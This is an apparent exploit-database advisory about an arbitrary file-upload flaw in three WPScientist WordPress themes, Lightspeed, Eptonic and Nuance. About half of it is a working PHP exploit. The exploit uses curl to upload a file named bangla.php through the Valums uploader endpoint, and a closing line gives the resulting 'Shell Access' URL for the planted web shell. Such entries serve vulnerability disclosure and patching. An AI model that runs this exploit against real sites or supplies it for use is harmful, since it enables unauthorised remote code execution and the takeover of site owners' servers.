source: http://www.securityfocus.com/bid/57152/info

Multiple themes from WPScientist for WordPress are prone to an arbitrary file-upload vulnerability because it fails to adequately validate files before uploading them.

An attacker may leverage this issue to upload arbitrary files to the affected computer; this can result in an arbitrary code execution within the context of the vulnerable application.

The following themes are vulnerable:

Lightspeed version 1.1.2
Eptonic version 1.4.3
Nuance version 1.2.3 

=================== EXPLOIT====================
<?php

$uploadfile="bangla.php"; 
$ch =
curl_init("http://www.example.com/wordpress/VALUMS_UPLOADER_PATH/php.php");
curl_setopt($ch, CURLOPT_POST, true); 
curl_setopt($ch, CURLOPT_POSTFIELDS,
array('qqfile'=>"@$uploadfile"));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($ch);
curl_close($ch);
print "$postResult";

?>

Shell Access: http://www.example.com/wp-content/uploads/2013/01/bangla.php